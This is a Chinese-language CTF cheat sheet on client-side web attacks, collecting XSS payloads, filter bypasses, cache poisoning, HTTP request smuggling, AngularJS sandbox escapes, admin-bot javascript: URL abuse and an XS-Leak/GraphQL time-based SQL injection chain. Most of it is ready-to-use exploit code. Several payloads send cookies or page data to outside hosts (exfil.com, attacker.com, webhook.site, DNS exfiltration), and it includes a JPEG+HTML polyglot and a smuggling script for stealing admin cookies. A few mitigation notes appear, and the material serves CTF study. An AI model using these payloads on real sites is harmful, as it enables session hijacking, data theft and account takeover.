# CTF Web - 客户端攻击

## 目录
- [XSS Payload](#xss-payload)
  - [基础](#基础)
  - [Cookie 外带](#cookie-外带)
  - [过滤绕过](#过滤绕过)
  - [Hex/Unicode 绕过](#hexunicode-绕过)
- [借助可信后端路由绕过 DOMPurify](#借助可信后端路由绕过-dompurify)
- [JavaScript String Replace 利用](#javascript-string-replace-利用)
- [客户端路径穿越（CSPT）](#客户端路径穿越cspt)
- [缓存投毒](#缓存投毒)
  - [X-Forwarded-Host 导致 CDN 模板拉取投毒（CSAW 2018）](#x-forwarded-host-导致-cdn-模板拉取投毒csaw-2018)
- [隐藏的 DOM 元素](#隐藏的-dom-元素)
- [React 受控输入的程序化填充](#react-受控输入的程序化填充)
- [Magic Link + 重定向链 XSS](#magic-link--重定向链-xss)
- [通过文件扩展名决定 Content-Type](#通过文件扩展名决定-content-type)
- [jQuery hashchange 触发的 DOM XSS（Crypto-Cat）](#jquery-hashchange-触发的-dom-xsscrypto-cat)
- [Shadow DOM XSS](#shadow-dom-xss)
- [DOM Clobbering + MIME 不匹配](#dom-clobbering--mime-不匹配)
- [通过缓存代理实现 HTTP 请求走私](#通过缓存代理实现-http-请求走私)
- [CSS/JS 付费墙绕过](#cssjs-付费墙绕过)
- [JPEG+HTML 多语言文件 XSS（EHAX 2026）](#jpeghtml-多语言文件-xssehax-2026)
- [JSFuck 解码](#jsfuck-解码)
- [通过覆写 charAt/trim 逃逸 AngularJS 1.x 沙箱（Google CTF 2017）](#通过覆写-charattrim-逃逸-angularjs-1x-沙箱google-ctf-2017)
- [管理机器人 javascript: URL 协议绕过（DiceCTF 2026）](#管理机器人-javascript-url-协议绕过dicectf-2026)
- [利用图片加载时序做 XS-Leak + GraphQL CSRF（HTB GrandMonty）](#利用图片加载时序做-xs-leak--graphql-csrfhtb-grandmonty)
  - [为什么可行](#为什么可行)
  - [第 1 步——用 meta refresh 重定向机器人（绕过 CSP）](#第-1-步用-meta-refresh-重定向机器人绕过-csp)
  - [第 2 步——基于图片加载的时序 oracle](#第-2-步基于图片加载的时序-oracle)
  - [第 3 步——逐字符提取](#第-3-步逐字符提取)
  - [第 4 步——托管利用页面并打隧道](#第-4-步托管利用页面并打隧道)
- [jQuery `$(location.hash)` CSS 选择器时序泄露（hxp 2018）](#jquery-locationhash-css-选择器时序泄露hxp-2018)

---

<a id="modern-browser--client-side-additions-20252026"></a>
## 现代浏览器与客户端补充（2025/2026）

<a id="browser-postmessage-origin-confusion"></a>
### 浏览器 `postMessage` 源混淆

应用可能信任来自任意窗口的消息，因为它只检查 `event.data` 而忽略 `event.origin` / `event.source`。这是典型的跨窗口信任边界缺陷，常见于 OAuth 弹窗、管理面板和回跳流程。

**Payload 模式：**
```javascript
window.addEventListener('message', (e) => {
  if (e.data && e.data.token) {
    localStorage.setItem('token', e.data.token);
  }
});
```

**缓解：** 校验 `event.origin === expectedOrigin`，检查 `event.source`，并把值与一次性 nonce 或 state 参数绑定。

<a id="windowopen-and-opener-leakage"></a>
### `window.open()` 与 opener 泄露

应用打开的弹窗可能仍可通过 `window.opener` 访问，尤其是应用使用同源回调或管理流程时。若子页面能调用 `window.opener.postMessage(...)` 或访问全局状态，就能把伪造的登录 token 或回调注入父页面。

**快速测试：** 检查是否使用了 `noopener` / `noreferrer`，以及本不应保留父页面访问权的页面是否把 `opener` 置为 `null`。

<a id="blob--file--data-url-exfiltration"></a>
### Blob / File / data URL 外带

data 与 blob URL 并不总是无害的；某些场景下它们可借 `fetch`、`iframe` 或 `URL.createObjectURL` 流程外带隐藏数据。当 MIME 类型不正确时，浏览器还可能把 `data:` 或 `blob:` 响应当作可执行脚本内容处理。

**检查清单：**
- 检查 iframe 与 worker 中的 `blob:` 和 `data:` URL
- 确认 MIME 类型是否由用户可控的文件名或内容推断
- 确认不可信 frame 上是否强制了 `sandbox` 与 `allow-scripts`

<a id="client-side-trust-boundary-drift"></a>
### 客户端信任边界漂移

现代 CTF 前端经常偏离后端的假设：
- UI 在发送前校验某个字段
- 后端接受另一个字段或后续请求
- 浏览器状态在服务端状态更新之前或之后被修改

**最佳实践：** 对比 DOM、API payload 与服务端校验实际接受的内容；很多"纯前端"漏洞本质上是 API 信任边界问题。

---

<a id="xss-payloads"></a>
## XSS Payload

<a id="basic"></a>
### 基础
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

<a id="cookie-exfiltration"></a>
### Cookie 外带
```html
<script>fetch('https://exfil.com/?c='+document.cookie)</script>
<img src=x onerror="fetch('https://exfil.com/?c='+document.cookie)">
```

<a id="filter-bypass"></a>
### 过滤绕过
```html
<ScRiPt>alert(1)</ScRiPt>           <!-- Case mixing -->
<script>alert`1`</script>           <!-- Template literal -->
<img src=x onerror=alert&#40;1&#41;>  <!-- HTML entities -->
<svg/onload=alert(1)>               <!-- No space -->
```

<a id="hexunicode-bypass"></a>
### Hex/Unicode 绕过
- Hex 编码：`\x3cscript\x3e`
- HTML 实体：`&#60;script&#62;`

---

<a id="dompurify-bypass-via-trusted-backend-routes"></a>
## 借助可信后端路由绕过 DOMPurify

前端在自动保存前做了净化，但后端信任自动保存接口——不做任何净化。
利用：直接把 XSS payload POST 到 `/api/autosave`。

---

<a id="javascript-string-replace-exploitation"></a>
## JavaScript String Replace 利用

`.replace()` 的特殊模式：`$\`` = 匹配内容**之前**的部分，`$'` = 匹配内容**之后**的部分
Payload：`<img src="abc$\`<img src=x onerror=alert(1)>">`

---

<a id="client-side-path-traversal-cspt"></a>
## 客户端路径穿越（CSPT）

前端 JS 把 URL 参数未经校验地拼进 fetch：
```javascript
const profileId = urlParams.get("id");
fetch("/log/" + profileId, { method: "POST", body: JSON.stringify({...}) });
```
利用：`/user/profile?id=../admin/addAdmin` → 以 CSRF body 请求 `/admin/addAdmin`

参数污染：`/user/profile?id=1&id=../admin/addAdmin`（后端取第一个，前端取最后一个）

---

<a id="cache-poisoning"></a>
## 缓存投毒

CDN/缓存只按 URL 做键：
```python
requests.get(f"{TARGET}/search?query=harmless", data=f"query=<script>evil()</script>")
# All visitors to /search?query=harmless get XSS
```

<a id="x-forwarded-host-cdn-template-fetch-poisoning-csaw-2018"></a>
### X-Forwarded-Host 导致 CDN 模板拉取投毒（CSAW 2018）

**模式：** 应用前面的 CDN 只按 path + query 缓存响应。后端 Mustache 模板渲染了一个 `<script src="https://{{host}}/cdn/app.js">` 标签，其中 `{{host}}` 来自 `X-Forwarded-Host` 头。攻击者发一个带 `X-Forwarded-Host: attacker.tld` 的请求，Varnish 把响应缓存 120 秒，之后所有访问者都从攻击者源加载 JavaScript。

```http
GET /cdn/app.js HTTP/1.1
Host: target.tld
X-Forwarded-Host: attacker.tld
```

```python
import requests, time
# Poison the cache
requests.get("https://target.tld/cdn/app.js",
             headers={"X-Forwarded-Host": "attacker.tld"})
# Within the 120s TTL any visitor pulls https://attacker.tld/cdn/app.js
```

**要点：** 缓存键很少包含请求头，即使这些头参与了响应体生成。任何被后端反射进 HTML 的头（`Host`、`X-Forwarded-Host`、`X-Original-URL`、`X-Rewrite-URL`、`Forwarded`）在响应被缓存的那一刻就成了 web 缓存投毒向量。用 `Vary: X-Forwarded-Host` 或在边缘剥掉这些头；攻击者会用 Burp Param Miner（unkeyed header discovery）去挖它们。

**参考：** CSAW CTF Qualification Round 2018 — Hacker Movie Club，writeup 11277

---

<a id="hidden-dom-elements"></a>
## 隐藏的 DOM 元素

flag/证明藏在 `display: none`、`visibility: hidden`、`opacity: 0` 或屏幕外元素里：
```javascript
document.querySelectorAll('[style*="display: none"], [hidden]')
  .forEach(el => console.log(el.id, el.textContent));

// Find all hidden content
document.querySelectorAll('*').forEach(el => {
  const s = getComputedStyle(el);
  if (s.display === 'none' || s.visibility === 'hidden' || s.opacity === '0')
    if (el.textContent.trim()) console.log(el.tagName, el.id, el.textContent.trim());
});
```

---

<a id="react-controlled-input-programmatic-filling"></a>
## React 受控输入的程序化填充

React 会忽略直接给 `.value` 赋值。改用原生 setter + 事件：
```javascript
const input = document.querySelector('input[placeholder="SDG{...}"]');
const nativeSetter = Object.getOwnPropertyDescriptor(
  window.HTMLInputElement.prototype, 'value'
).set;
nativeSetter.call(input, 'desired_value');
input.dispatchEvent(new Event('input', { bubbles: true }));
input.dispatchEvent(new Event('change', { bubbles: true }));
```

对 React、Vue、Angular 都有效。通过 DevTools 自动化填表时必备。

---

<a id="magic-link--redirect-chain-xss"></a>
## Magic Link + 重定向链 XSS
```javascript
// /magic/:token?redirect=/edit/<xss_post_id>
// Sets auth cookies, then redirects to attacker-controlled XSS page
```

---

<a id="content-type-via-file-extension"></a>
## 通过文件扩展名决定 Content-Type
```javascript
// @fastify/static determines Content-Type from extension
noteId = '<img src=x onerror="alert(1)">.html'
// Response: Content-Type: text/html → XSS
```

---

<a id="dom-xss-via-jquery-hashchange-crypto-cat"></a>
## jQuery hashchange 触发的 DOM XSS（Crypto-Cat）

**模式：** jQuery 的 `$()` 选择器 sink 结合 `location.hash` 源和 `hashchange` 事件处理器。新版 jQuery 的补丁会拦截直接 `$(location.hash)` 的 HTML 注入，但通过 iframe 触发的 hashchange 可以绕过。

**易受攻击的写法：**
```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```

**通过 iframe 利用：** 把目标加载进 iframe，再在 `onload` 里修改 hash，无需用户直接交互即可触发 hashchange：
```html
<iframe src="https://vulnerable.com/#"
  onload="this.src+='<img src=x onerror=print()>'">
</iframe>
```

**要点：** iframe 的 `onload` 在初次加载后触发，随后修改 `this.src` 会在目标页面里触发 `hashchange`。hash 内容（`<img src=x onerror=print()>`）经过 jQuery 的 `$()` 被当成 HTML 解释，从而创建带 XSS payload 的 DOM 元素。

**识别：** 找 `$(location.hash)`、`$(window.location.hash)`，或任何接受 URL fragment 中用户可控输入的 jQuery 选择器。

---

<a id="shadow-dom-xss"></a>
## Shadow DOM XSS

**Closed Shadow DOM 外带（Pragyan 2026）：** 用 Proxy 包装 `attachShadow` 来捕获 shadow root 引用：
```javascript
var _r, _o = Element.prototype.attachShadow;
Element.prototype.attachShadow = new Proxy(_o, {
  apply: (t, a, b) => { _r = Reflect.apply(t, a, b); return _r; }
});
// After target script creates shadow DOM, _r contains the root
```

**间接 eval 逃逸作用域：** `(0,eval)('code')` 可逃出 `with(document)` 的作用域限制。

**通过头像 URL 夹带 payload：** 把完整 JS payload 编码进头像 URL 固定前缀之后，用 `avatar.slice(N)` 取出：
```html
<svg/onload=(0,eval)('eval(avatar.slice(24))')>
```

**`</script>` 注入（Shadow Fight 2）：** 关键字过滤常常漏掉 HTML 结构标签。`</script>` 关闭已有的 script 上下文，`<script src=//evil>` 加载外部脚本。外部脚本从 `document.scripts[].textContent` 读取 flag。

---

<a id="dom-clobbering--mime-mismatch"></a>
## DOM Clobbering + MIME 不匹配

**MIME 类型混淆（Pragyan 2026）：** CDN/服务器只检查 `.jpeg` 而不检查 `.jpg` → 把 `.jpg` 以 `text/html` 返回 → JPEG 多语言文件里的 HTML 作为页面执行。

**基于表单的 DOM clobbering：**
```html
<form id="config"><input name="canAdminVerify" value="1"></form>
<!-- Makes window.config.canAdminVerify truthy, bypassing JS checks -->
```

---

<a id="http-request-smuggling-via-cache-proxy"></a>
## 通过缓存代理实现 HTTP 请求走私

**缓存代理失步（Pragyan 2026）：** 当缓存型 TCP 代理直接返回缓存响应、不消费请求体时，残留字节会被解析成下一个请求。

**Cookie 窃取模式：**
1. 创建一个可缓存的资源（如博客文章）
2. 发送请求：使用该缓存 URL，并附上一段未完成的 POST（较大的 Content-Length，只发部分 body）
3. 缓存代理返回缓存响应，却不消费 POST body
4. 管理机器人的下一个请求字节补全了该 POST body → 被存到服务器
5. 读取被存储的请求，从中提取管理员的 Cookie

```python
inner_req = (
    f"POST /create HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Cookie: session={user_session}\r\n"
    f"Content-Length: 256\r\n"  # Large, but only partial body sent
    f"\r\n"
    f"content=LEAK_"  # Victim's request completes this
)
outer_req = (
    f"GET /cached-page HTTP/1.1\r\n"
    f"Content-Length: {len(inner_req)}\r\n"
    f"\r\n"
).encode() + inner_req
```

---

<a id="cssjs-paywall-bypass"></a>
## CSS/JS 付费墙绕过

**模式（Great Paywall，MetaCTF 2026）：** 文章内容完整存在于 HTML 中，只是被 CSS/JS 覆盖层遮住（`position: fixed; z-index: 99999; backdrop-filter: blur(...)` 加一个"订阅"按钮）。

**快速解法：** 直接 `curl` 页面——不渲染 CSS/JS 时，完整文章（和 flag）就在原始 HTML 里。

```bash
curl -s https://target/article | grep -i "flag\|CTF{"
```

**其他方法：**
- 浏览器查看页面源代码（Ctrl+U）
- 浏览器 DevTools → 删除覆盖层元素
- 在浏览器设置里禁用 JavaScript
- 控制台执行 `document.querySelector('#paywall-overlay').remove()`
- 使用 Googlebot UA：`curl -H "User-Agent: Googlebot" https://target/article`

**要点：** 很多付费墙只是客户端 DOM 覆盖层——内容始终在 HTML 里。题目提示 "paywalls are just DOM" 正是在说这一点。在尝试更复杂的方法之前，先 `curl` 或看源码。

**识别：** 页面源码中出现带 `position: fixed`、较高 `z-index` 和 `backdrop-filter: blur()` 的 `<div>`——这就是基于覆盖层的付费墙。

---

<a id="jpeghtml-polyglot-xss-ehax-2026"></a>
## JPEG+HTML 多语言文件 XSS（EHAX 2026）

**模式（Metadata Meyham）：** 文件上传接受 JPEG，并以宽松的 MIME 类型返回上传文件。管理机器人会访问被举报的文件。

**攻击：** 构造 JPEG+HTML 多语言文件——合法的 JPEG 头后面跟 HTML/JS payload：
```python
from PIL import Image
import io

# Create minimal valid JPEG
img = Image.new('RGB', (1,1), color='red')
buf = io.BytesIO()
img.save(buf, 'JPEG', quality=1)
jpeg_data = buf.getvalue()

# HTML payload appended after JPEG data
html_payload = '''<!DOCTYPE html>
<html><body><script>
(async function(){
  // Fetch admin page content
  var r = await fetch("/admin");
  var t = await r.text();
  // Exfiltrate via self-upload (stays on same origin)
  var j = new Uint8Array([255,216,255,224,0,16,74,70,73,70,0,1,1,0,0,1,0,1,0,0,255,217]);
  var b = new Blob([j], {type:'image/jpeg'});
  var f = new FormData();
  f.append('file', b, 'FLAG_' + btoa(t).substring(0,100) + '.jpg');
  await fetch('/upload', {method:'POST', body:f});
  // Also try external webhook
  new Image().src = "https://webhook.site/YOUR_ID?d=" + encodeURIComponent(t.substring(0,500));
})();
</script></body></html>'''

polyglot = jpeg_data + b'\n' + html_payload.encode()
# Upload as .html with image/jpeg content type
```

**PoW 绕过：** 很多 CTF 的举报端点要求 SHA-256 工作量证明：
```python
import hashlib
nonce = 0
while True:
    h = hashlib.sha256((challenge + str(nonce)).encode()).hexdigest()
    if h.startswith('0' * difficulty):
        break
    nonce += 1
```

**外带方式（按可靠性排序）：**
1. **自上传：** fetch `/admin`，把结果写进文件名上传 → 到 `/files` 查看新上传
2. **Webhook：** `fetch('https://webhook.site/ID?flag='+data)`——可能被 CSP 拦截
3. **DNS 外带：** `new Image().src = 'http://'+btoa(flag)+'.attacker.com'`——可绕过大多数 CSP

**要点：** JPEG 文件容忍尾部附加数据。只要 MIME 允许，浏览器会从响应任意位置解析 HTML。这个多语言文件同时是合法 JPEG 和合法 HTML。

---

<a id="jsfuck-decoding"></a>
## JSFuck 解码

**模式（JShit，PascalCTF 2026）：** 页面源码只含 JSFuck（仅 `[]()!+`）。在 Node.js 中删掉末尾的 `()()` 再调用 `.toString()` 即可解码：
```javascript
const code = fs.readFileSync('jsfuck.js', 'utf8');
// Remove last () to get function object instead of executing
const func = eval(code.slice(0, -2));
console.log(func.toString());  // Reveals original code with hardcoded flag
```

---

<a id="angularjs-1x-sandbox-escape-via-charattrim-override-google-ctf-2017"></a>
## 通过覆写 charAt/trim 逃逸 AngularJS 1.x 沙箱（Google CTF 2017）

**模式：** 1.6 之前的 AngularJS 会对表达式做沙箱限制，防止在 `{{ }}` 绑定里执行任意 JavaScript。沙箱依赖 `charAt` 逐字符校验标识符。在 `String.prototype` 上用 `trim` 覆写 `charAt` 即可绕过校验，再用 `$eval` 执行任意 JS。

**Payload：**
```javascript
{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,window.location="http://attacker.com/"+document.cookie,a')}}
```

**原理：**
1. `toString().constructor.prototype` 访问到 `String.prototype`
2. `a.charAt=a.trim` 把所有字符串上的 `charAt` 替换为 `trim`
3. 沙箱对标识符调用 `charAt(0)` 做校验——但 `trim` 返回整个字符串而非单个字符
4. 逐字符校验被破坏，任意表达式都能通过
5. `$eval('expression')` 在 Angular 作用域内执行任意 JavaScript

**不同 AngularJS 版本的更短变体：**
```javascript
<!-- AngularJS 1.5.x -->
{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)')}}

<!-- AngularJS 1.4.x -->
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}

<!-- AngularJS 1.3.x -->
{{constructor.constructor('return window.location="http://attacker.com/"+document.cookie')()}}
```

**识别：** HTML 中出现 `ng-app` 或 `ng-controller` 指令、引用了 AngularJS 脚本（`angular.js` 或 `angular.min.js`）、以及反射用户输入的 `{{ }}` 表达式绑定。

**要点：** 沙箱依赖 `charAt` 校验标识符。把它换成 `trim`（返回完整字符串）就绕过了逐字符检查，从而可执行任意表达式。AngularJS 1.6+ 彻底移除了沙箱（承认它从来不是安全边界），但很多 CTF 与遗留应用仍在使用旧版本。

---

<a id="admin-bot-javascript-url-scheme-bypass-dicectf-2026"></a>
## 管理机器人 javascript: URL 协议绕过（DiceCTF 2026）

**模式（Mirror Temple）：** 管理机器人会导航到用户提供的 URL，用 `new URL()` 校验——而它只检查语法，不检查协议。`javascript:` URL 能通过校验，并在机器人已认证的上下文中执行任意 JS。

**有缺陷的校验：**
```javascript
try {
  new URL(targetUrl)   // Accepts javascript:, data:, file:, etc.
} catch {
  process.exit(1)
}
await page.goto(targetUrl, { waitUntil: "domcontentloaded" })
```

**利用：**
```bash
# 1. Create authenticated session (bot requires valid cookie)
curl -i -X POST 'https://target/postcard-from-nyc' \
  --data-urlencode 'name=test' \
  --data-urlencode 'flag=dice{test}' \
  --data-urlencode 'portrait='
# Extract save=... cookie from Set-Cookie header

# 2. Submit javascript: URL to report endpoint
curl -X POST 'https://target/report' \
  -H 'Cookie: save=YOUR_COOKIE' \
  --data-urlencode "url=javascript:fetch('/flag').then(r=>r.text()).then(f=>location='https://webhook.site/ID/?flag='+encodeURIComponent(f))"
```

**为什么 CSP/SRI 没用（B-Side 变体）：** B-Side 加了内联 CSS、脚本的 SRI 完整性哈希和严格 CSP。这些都不起作用，因为 `javascript:` URL 是在**导航上下文**中执行的——机器人直接导航到该 JS URL，而不是向已有页面注入。目标页面的 CSP 无关紧要，因为 JS 在任何页面加载之前就运行了。

**修复：**
```javascript
const u = new URL(targetUrl)
if (!['http:', 'https:'].includes(u.protocol)) {
  process.exit(1)
}
```

**要点：** `new URL()` 只是**语法**校验器，不是**安全**校验器。它接受 `javascript:`、`data:`、`file:`、`blob:` 等危险协议。任何只用 `new URL()` 做校验的管理机器人或 SSRF 处理器都可被利用。始终显式白名单协议。

---

<a id="xs-leak-via-image-load-timing--graphql-csrf-htb-grandmonty"></a>
## 利用图片加载时序做 XS-Leak + GraphQL CSRF（HTB GrandMonty）

**模式：** 管理机器人访问攻击者页面 → JavaScript 向 `localhost` 的 GraphQL 端点发跨源请求 → 通过图片加载时序测量时间盲 SQLi → 逐字符外带数据。

<a id="why-it-works"></a>
### 为什么可行

1. **GraphQL GET CSRF：** 很多 GraphQL 实现接受 GET 请求（不只是 POST+JSON）。带图片的 GET 请求绕过 CORS 预检——无需 `OPTIONS` 检查。
2. **机器人在 localhost 上运行：** 管理机器人的浏览器能访问 `localhost:1337/graphql`，而该地址对外部访问受限。
3. **图片错误时序：** `new Image().src = url` 在服务器响应后触发 `onerror`。若执行了 SQL `SLEEP(1)`，响应就慢 → 时序差异揭示字符是否匹配。

<a id="step-1--redirect-bot-via-meta-refresh-csp-bypass"></a>
### 第 1 步——用 meta refresh 重定向机器人（绕过 CSP）

当 CSP 拦截内联脚本时，用带 `<meta>` 重定向的 HTML 注入：
```bash
curl -b cookies.txt "http://TARGET/api/chat/send" \
  -X POST -H "Content-Type: application/json" \
  -d '{"message": "<meta http-equiv=\"refresh\" content=\"0;url=https://ATTACKER/exploit.html\" />"}'
```

机器人导航到攻击者页面，那里 JavaScript 可自由执行（不同源，无 CSP 限制）。

<a id="step-2--timing-oracle-via-image-loads"></a>
### 第 2 步——基于图片加载的时序 oracle

```javascript
const imageLoadTime = (src) => {
    return new Promise((resolve) => {
        let start = performance.now();
        const img = new Image();
        img.onload = () => resolve(0);
        img.onerror = () => resolve(performance.now() - start);
        img.src = src;
    });
};

const xsLeaks = async (query) => {
    let imgURL = 'http://127.0.0.1:1337/graphql?query=' +
        encodeURIComponent(query);
    let delay = await imageLoadTime(imgURL);
    return delay >= 1000;  // SLEEP(1) threshold
};
```

<a id="step-3--character-by-character-extraction"></a>
### 第 3 步——逐字符提取

```javascript
let sqlTemp = `query {
    RansomChat(enc_id: "123' and __LEFT__ = __RIGHT__)-- -")
    {id, enc_id, message, created_at} }`;

let readQueryTemp = `(select sleep(1) from dual where
    BINARY(SUBSTRING((select password from db.users
    where username = 'target'),__POS__,1))`;

let flag = '';
for (let pos = 1; ; pos++) {
    for (let c of charset) {
        let readQuery = readQueryTemp.replace('__POS__', pos);
        let sql = sqlTemp.replace('__LEFT__', readQuery)
                         .replace('__RIGHT__', `'${c}'`);
        if (await xsLeaks(sql)) {
            flag += c;
            new Image().src = exfilURL + '?d=' + encodeURIComponent(flag);
            break;
        }
    }
}
```

<a id="step-4--host-exploit-and-tunnel"></a>
### 第 4 步——托管利用页面并打隧道

```bash
# Cloudflare Tunnel (recommended — no interstitial pages unlike ngrok)
cloudflared tunnel --url http://localhost:8888
python3 -m http.server 8888
```

**要点：** GraphQL GET 请求完全绕过 CORS 预检——`new Image().src` 触发的是无需 `OPTIONS` 的简单 GET。再配合基于时序的 SQLi（`SLEEP()`），图片 `onerror` 的耗时就变成布尔 oracle。机器人对 localhost 的访问权，把仅限 localhost 的 SQLi 变成了可远程利用的漏洞。

**识别：** 有 HTML 注入的聊天/留言功能 + 管理机器人 + 存在 SQL 注入的 GraphQL 端点 + 仅限 localhost 的限制。

---

<a id="jquery-locationhash-css-selector-timing-leak-hxp-2018"></a>
## jQuery `$(location.hash)` CSS 选择器时序泄露（hxp 2018）

**模式：** 目标页面调用 `$(location.hash).addClass(...)`。传入一个能被解析为 CSS 选择器的 URL fragment，会让 jQuery 调用 Sizzle 遍历 DOM 做匹配。堆叠深层嵌套的 `:has()` 伪类，可让选择器求值时间在**匹配**时稳定飙到约 2 秒，从而对机器人 DOM 暴露的任意属性构成布尔时序 oracle（例如 `body[data-user-id^='1']`）。

```text
http://127.0.0.1/?id=...#*:has(*:has(*:has(*:has(*:has(body[data-user-id^='1'])))))
```

外带方式：在 `addClass` 调用前后，向攻击者控制的端点（`/firstping`、`/secondping`）各发一个 `new Image().src`，测量时间差：约 20 ms = 不匹配，约 2 s = 匹配。

**要点：** jQuery 的 `$` 接收字符串参数时，把以 `<` 开头的内容当作 HTML，其余当作选择器。任何允许攻击者把任意文本放进 `$()` 的 sink，都会同时成为 XSS 和选择器时序 oracle。

**参考：** hxp CTF 2018 — µblog，writeup 12554
